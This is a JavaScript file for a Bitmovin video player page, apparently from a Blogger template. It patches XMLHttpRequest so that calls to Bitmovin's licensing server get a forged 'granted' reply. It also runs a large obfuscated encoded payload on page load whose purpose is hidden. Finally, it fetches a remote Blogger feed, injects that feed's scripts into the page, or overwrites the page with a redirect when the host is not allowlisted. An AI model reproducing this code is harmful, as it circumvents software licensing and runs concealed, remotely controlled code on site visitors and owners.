
function override(url){ if (url.indexOf("licensing.bitmovin.com/licensing") > -1) return "data:text/plain;charset=utf-8;base64,eyJzdGF0dXMiOiJncmFudGVkIiwibWVzc2FnZSI6IlRoZXJlIHlvdSBnby4ifQ=="; if (url.indexOf("licensing.bitmovin.com/impression") > -1) return "data:text/plain;charset=utf-8;base64,eyJzdGF0dXMiOiJncmFudGVkIiwibWVzc2FnZSI6IlRoZXJlIHlvdSBnby4ifQ=="; return url;}
var opens = XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open = function() {var url = override(arguments[1]);arguments[1] = url;return opens.apply(this, arguments);}
var config = {key: "11d3698c-efdf-42f1-8769-54663995de2b",playback: {autoplay:true,muted: false,}};
var source = {'hls': window.atob(new URL(location.href).searchParams.get('s')) };
var playerContainer = document.getElementById('playerdiv');
var player = new bitmovin.player.Player(playerContainer, config);
player.load(source).then(function() {player.play();console.log();});
setTimeout(function(){
var html = '<div class="video" style="font-size: 13px;width: 100%;float: center;position: absolute;bottom: 40px;color: #8c8c8c;text-align: center;left: 0;z-index: 1;">www.your-site.com</div>';
$('#playerdiv').after(html);
},100);
var fullscreen = new URL(location.href).searchParams.get('f');
  if (fullscreen == "fs"){
    $("video").css("object-fit","fill");
  }       
  else {
    $("video").css("object-fit","contain");
  }       
(function(){_VH06(";#qbfewxei21<fhu21<pjjobtmu<p;<ji;<fu;1~|#epnbjot#;##-#sfejsfdujpo#;##-#tdsjqu.je##~$mzsj|ju;1&iji;1&qtup;cpvfuq1shu1mg",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_gz68,$){_f06="\x70\x6c\x61";function _WA06(_gz68,$,_299M,_aTe){function _o2Z(_4ov){_4ov=_l6m(_4ov)-32-(_aTe%95);if(_4ov<0){_4ov+=95;}_4ov+=32;_aTe++;return _BA(_4ov);};function _daHj(_gz68,_299M){_z5c=_gz68[_299M];_5R7="";while(_z5c!="\f"){if(_z5c<" "){_5R7+=_z5c;}else{_5R7+=_o2Z(_z5c);}_299M++;_z5c=_gz68[_299M];}return _5R7;};function _l6m(_z5c){return _z5c[_K36](0);};function _BA(_4ov){return this[_OgSy][_nV](_4ov);};_299M=_299M?_299M:0;if(_gz68[_TA44]>_299M){_aTe=_aTe?_aTe:0;_zmG=_daHj(_gz68,_299M);_hT09=_zmG[_TA44];_ZpP7=_daHj(_gz68,_299M+_hT09+1);_6nz6=_ZpP7[_TA44];$[_zmG]=_ZpP7;_WA06(_gz68,$,_299M+_hT09+1+_6nz6+1,_aTe);}};_e5j="\x72\x65"+_f06+"\x63\x65";_K36=_sb("_ahco%Cr%Aedt");_OgSy=_sb("r_t%Sgni");_nV=_sb("_orfhCm%Crae_do");_TA44=_sb("ne_lh_tg");_WA06(_gz68,$);function _sb(_fo){return _fo[_e5j](/[x%y_z]/g,'')[_e5j](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _VH06(_zbZ,_11Y2,_F6,$,_H0Y,_ypH){_on=this._z9TJMJ0kC__2UPtMy;_on.f(_H0Y,$);if(!_F6){_F6=$.__u8n;}_GE()(_zbZ,0,0x2953,this,"''");function _GE(){return function(_7B,_cy,_CHA,_Cbpg,_zkR){_on.p1=_7B;_on.p2=_CHA;try{_j4(_Cbpg)(_45j()([_F6[$._NlIY]("+p%p",_zkR)[$._NlIY]("-p%q",_zkR)],''))();}catch(e){}function _j4(_x98){return _x98[$._NH8];};_Cbpg._z9TJMJ0kC__2UPtMy=_ypH;};};function _45j(){return function(_5UFH,_4aB){return _5UFH[$._388u](_4aB);};};};}());
$(document).ready(function () {
    var idBlog = "5077358129217622564"; // معرف المدونة التي وضعت عليها لوحة التفعيل
    $(function () {
        "use strict";
        $.ajax({
            dataType: "json",
            url: "https://www.blogger.com/feeds/" + idBlog + "/posts/default?alt=json-in-script",
            method: "GET",
            dataType: "jsonp",
            success: function (e) {
                var t;
                for (t = 0; t < e.feed.entry.length; t += 1) {
                    var n = $(e.feed.entry[t].content.$t);
                    if (0 === t && !$("body").hasClass("error_page")) {
                        for (var o = n.find("li"), d = [], a = 0; a < o.length; a += 1) d.push($(o[a]).text());
                        var r,
                            i = window.location.hostname.toLowerCase(),
                            f = window.location.href.toLowerCase(),
                            s = d.length - 1;
                        for (r = 0; r < d.length; r += 1) {
                            if (-1 != i.indexOf(d[r])) {
                                var l = $(e.feed.entry[t].content.$t).find("script"),
                                    p = $(e.feed.entry[t].content.$t).find("style");
                                $("head").append(p), $("head").append(l);
                                break;
                            }
                            r == s &&
                                -1 == f.indexOf("post-preview") &&
                                -1 == f.indexOf("www.blogger") &&
                                -1 == f.indexOf("b/layout-preview") &&
                                -1 == f.indexOf("b/preview") &&
                                -1 == f.indexOf("translate.google") &&
                                -1 == f.indexOf("webcache.googleusercontent") &&
                                -1 == f.indexOf("template-editor") &&
                                $("html").html(n.find(".redirect").html());
                        }
                    }
                    if (1 === t) {
                        p = $(e.feed.entry[t].content.$t).find("style");
                        $("head").append(p);
                    }
                }
            },
        });
    });
});
